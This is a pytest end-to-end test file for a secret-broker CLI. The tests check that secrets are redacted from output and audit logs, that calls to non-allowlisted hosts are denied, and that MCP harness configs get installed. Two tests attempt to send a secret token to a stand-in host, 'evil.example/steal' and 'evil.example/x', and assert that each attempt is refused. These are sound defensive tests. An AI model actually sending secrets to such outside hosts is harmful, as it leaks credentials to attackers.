"""Local E2E: full CLI + broker paths without cloud credentials."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from secret_broker.adapters.memory import MemoryAdapter
from secret_broker.audit import AuditLog
from secret_broker.broker import Broker
from secret_broker.cli.app import app
from secret_broker.config import BrokerConfig
from secret_broker.policy import Policy, PolicyDenied

runner = CliRunner()

SECRET = "e2e_local_secret_DO_NOT_LEAK_9f3a"


@pytest.fixture
def e2e_home(tmp_path: Path) -> dict[str, Path]:
    home = tmp_path / "home"
    root = tmp_path / "project"
    home.mkdir()
    root.mkdir()
    cfg = root / "secret-broker.toml"
    cfg.write_text(
        "\n".join(
            [
                "[broker]",
                f'audit_path = "{root / "audit.jsonl"}"',
                f'policy_path = "{root / "policy.toml"}"',
                'default_format = "table"',
                "",
                "[stores.memory]",
                'type = "memory"',
                "",
                "[stores.env]",
                'type = "env"',
                "",
                "[policy]",
                "default_deny_hosts = true",
                'allowed_hosts = ["example.com"]',
                'allowed_bins = ["python3", "true", "echo"]',
                "",
            ]
        ),
        encoding="utf-8",
    )
    return {"home": home, "root": root, "config": cfg}


def test_doctor_via_cli(e2e_home: dict[str, Path]):
    result = runner.invoke(
        app,
        [
            "--config",
            str(e2e_home["config"]),
            "doctor",
            "--home",
            str(e2e_home["home"]),
            "--root",
            str(e2e_home["root"]),
        ],
    )
    assert result.exit_code == 0, result.stdout + result.stderr
    assert "leak_self_check" in result.stdout
    assert SECRET not in result.stdout


def test_run_redacts_secret_bytes(e2e_home: dict[str, Path]):
    cfg = BrokerConfig(
        path=e2e_home["config"],
        audit_path=str(e2e_home["root"] / "audit.jsonl"),
        policy_path=str(e2e_home["root"] / "policy.toml"),
        stores={"memory": {"type": "memory"}},
        policy_bootstrap={
            "default_deny_hosts": True,
            "allowed_hosts": ["example.com"],
            "allowed_bins": ["python3"],
        },
    )
    mem = MemoryAdapter()
    mem.put("TOKEN", SECRET)
    broker = Broker(
        config=cfg,
        adapters={"memory": mem},
        policy=Policy(
            default_deny_hosts=True,
            allowed_hosts={"example.com"},
            allowed_bins={"python3"},
        ),
        audit=AuditLog(cfg.audit_path),
        actor="e2e",
    )
    result = broker.run(
        ["python3", "-c", "import os; print(os.environ['TOKEN'])"],
        env_refs={"TOKEN": "secret://memory/TOKEN"},
    )
    assert result.exit_code == 0
    assert SECRET not in result.stdout
    assert "[REDACTED]" in result.stdout
    audit = Path(cfg.audit_path).read_text(encoding="utf-8")
    assert SECRET not in audit
    assert "secret://memory/TOKEN" in audit


def test_call_denies_off_allowlist_host(e2e_home: dict[str, Path]):
    cfg = BrokerConfig(
        audit_path=str(e2e_home["root"] / "audit2.jsonl"),
        policy_path=str(e2e_home["root"] / "policy.toml"),
    )
    mem = MemoryAdapter()
    mem.put("TOKEN", SECRET)
    broker = Broker(
        config=cfg,
        adapters={"memory": mem},
        policy=Policy(default_deny_hosts=True, allowed_hosts={"example.com"}),
        audit=AuditLog(cfg.audit_path),
    )
    with pytest.raises(PolicyDenied):
        broker.call(url="https://evil.example/steal", ref_str="secret://memory/TOKEN")


def test_cli_call_off_allowlist_exit_code(
    e2e_home: dict[str, Path], monkeypatch: pytest.MonkeyPatch
):
    # Seed memory via broker doctor path is empty on CLI; use env adapter instead.
    monkeypatch.setenv("E2E_TOKEN", SECRET)
    cfg_path = e2e_home["config"]
    # rewrite config to prefer env + allow nothing useful for evil host
    text = cfg_path.read_text(encoding="utf-8")
    cfg_path.write_text(text, encoding="utf-8")
    result = runner.invoke(
        app,
        [
            "--config",
            str(cfg_path),
            "call",
            "--url",
            "https://evil.example/x",
            "--ref",
            "secret://env/E2E_TOKEN",
            "--inject",
            "bearer",
        ],
    )
    assert result.exit_code == 2
    assert "denied" in (result.stdout + result.stderr).lower()
    assert SECRET not in result.stdout
    assert SECRET not in result.stderr


def test_harness_install_all_project_scope(e2e_home: dict[str, Path]):
    result = runner.invoke(
        app,
        [
            "harness",
            "install",
            "--all",
            "--scope",
            "project",
            "--hooks",
            "--home",
            str(e2e_home["home"]),
            "--root",
            str(e2e_home["root"]),
        ],
    )
    assert result.exit_code == 0, result.stdout + result.stderr
    root = e2e_home["root"]
    assert (root / ".cursor" / "mcp.json").exists()
    assert (root / ".mcp.json").exists()
    assert (root / ".codex" / "config.toml").exists()
    assert (root / "opencode.json").exists()
    cursor = json.loads((root / ".cursor" / "mcp.json").read_text(encoding="utf-8"))
    assert "secret-broker" in cursor.get("mcpServers", {})
